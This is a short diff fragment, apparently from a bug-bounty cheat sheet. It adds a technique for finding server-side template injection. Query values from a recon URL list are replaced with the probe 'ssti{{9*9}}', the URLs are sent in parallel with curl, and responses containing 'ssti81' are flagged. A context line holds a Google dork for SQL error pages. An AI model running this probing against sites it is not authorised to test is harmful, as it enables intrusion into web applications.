@@ -719,7 +719,12 @@ site:test.com intext:”sql syntax near” | intext:”syntax error has occurred
 
 
 
+Find Template Injection through curl
 
+Recon, Content Discovery process has megs of lines recon.txt 
+
+✔️cat recon.txt | grep "=" | qsreplace "ssti{{9*9}}" > sssti
+✔️cat sssti | parallel -j50 -q curl -g | grep "ssti81" > ssti2_poc
 
 
 
